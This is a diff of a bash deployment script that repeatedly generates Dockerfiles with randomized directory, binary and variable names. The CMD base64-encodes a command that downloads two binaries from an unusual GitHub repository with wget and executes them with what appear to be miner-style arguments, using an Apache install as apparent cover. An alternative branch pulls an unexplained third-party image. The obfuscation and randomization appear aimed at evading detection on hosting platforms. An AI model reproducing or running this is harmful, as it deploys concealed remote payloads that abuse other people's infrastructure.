@@ -1,5 +1,5 @@
 #!/bin/bash
-# /docker - Correct: Fixed image uses CMD /bin/bash /start only
+# /docker - No port references for fixed image
 
 set -e
 
@@ -29,22 +29,6 @@ for i in 1 2 3; do
     UNIQUE_DIR="deploy_$(rand_str 12)_$(date +%s)_${RANDOM}"
     APP_DIR="/app/deployments/${UNIQUE_DIR}"
     
-    # ============ UNIQUE WORKDIR (only for Option 1) ============
-    UNIQUE_WORKDIR="/$(rand_str 15)"
-    
-    # ============ UNIQUE BINARY NAMES ============
-    BIN1="$(rand_str 10)"
-    BIN2="$(rand_str 10)"
-    
-    # ============ UNIQUE VARIABLES ============
-    VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
-    VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
-    VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
-    
-    # ============ URLS ============
-    SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
-    WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
-    
     # ============ UNIQUE APP NAME ============
     APP_NAME="app_$(rand_str 8)_$(date +%s)_${RANDOM}"
     
@@ -60,12 +44,23 @@ for i in 1 2 3; do
     
     # Pick random image (50/50 chance)
     if [[ $((RANDOM % 2)) -eq 0 ]]; then
-        # ============ OPTION 1: Random Ubuntu/Debian image with FULL COMMAND in CMD ============
+        # ============ OPTION 1: Random Ubuntu/Debian image ============
         WORKING_IMAGES=(
             "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
             "debian:11" "debian:12" "debian:bookworm"
         )
         RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
+        
+        # Unique variables for Option 1
+        UNIQUE_WORKDIR="/$(rand_str 15)"
+        BIN1="$(rand_str 10)"
+        BIN2="$(rand_str 10)"
+        VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        
+        SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
+        WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
         
         FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
 export DEBIAN_FRONTEND=noninteractive && \
@@ -79,10 +74,10 @@ echo 'ServerName localhost' >> /etc/apache2/apache2.conf && \
 wget -q --timeout=30 --tries=2 -O ${BIN1} \"${SOCAT_URL}\" && \
 wget -q --timeout=30 --tries=2 -O ${BIN2} \"${WEB8888_URL}\" && \
 chmod 755 ${BIN1} ${BIN2} && \
-(${UNIQUE_WORKDIR}/${BIN1} --daemon --port 8080 &) && \
+(${UNIQUE_WORKDIR}/${BIN1} --daemon &) && \
 service apache2 start && \
 sleep 5 && \
-exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} --port 8080"
+exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5}"
         
         ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
         
@@ -100,16 +95,16 @@ WORKDIR ${UNIQUE_WORKDIR}
 RUN apt-get update && apt-get install -y curl wget ca-certificates
 CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Option 1: Random image with full command in CMD"
+        echo "✅ Option 1: Random image with full command"
         
     else
-        # ============ OPTION 2: FIXED image - ONLY CMD /bin/bash /start ============
+        # ============ OPTION 2: FIXED image - NO PORT REFERENCES ============
         cat > Dockerfile << 'EOF'
 FROM phemextradebot/cleverbot8888
 WORKDIR /
 CMD /bin/bash /start
 EOF
-        echo "✅ Option 2: Fixed image - CMD /bin/bash /start only"
+        echo "✅ Option 2: Fixed image (no port configuration needed)"
     fi
     
     # Git setup
